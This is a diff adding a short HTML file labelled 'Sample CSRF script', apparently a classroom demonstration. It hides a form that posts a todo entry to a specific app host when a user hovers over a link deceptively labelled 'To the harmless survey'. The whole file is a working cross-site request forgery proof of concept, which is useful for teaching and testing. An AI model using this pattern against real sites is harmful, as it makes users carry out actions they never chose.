@@ -1,0 +1,24 @@
+<html>
+<head><title>Sample CSRF script</title>
+<script type="text/javascript">
+function makeTodo() {
+    var f = document.createElement('form');
+    f.style.display = 'none';
+    document.body.appendChild(f);
+    f.method = 'POST';
+    f.action = 'http://rubes-47642.use1.actionbox.io/todos';
+    
+    my_todo = document.createElement('INPUT');
+    my_todo.type = 'TEXT';
+    my_todo.name = 'todo[text]';
+    my_todo.value = "Don't forget to follow @bfist on Twitter so he will feel awesome."
+    f.appendChild(my_todo);
+   
+    f.submit();
+  }
+</script>
+</head>
+<body>
+  <a href="http://rubes-47642.use1.actionbox.io/todos" onmouseover="makeTodo()">To the harmless survey</a>
+</body>
+</html>
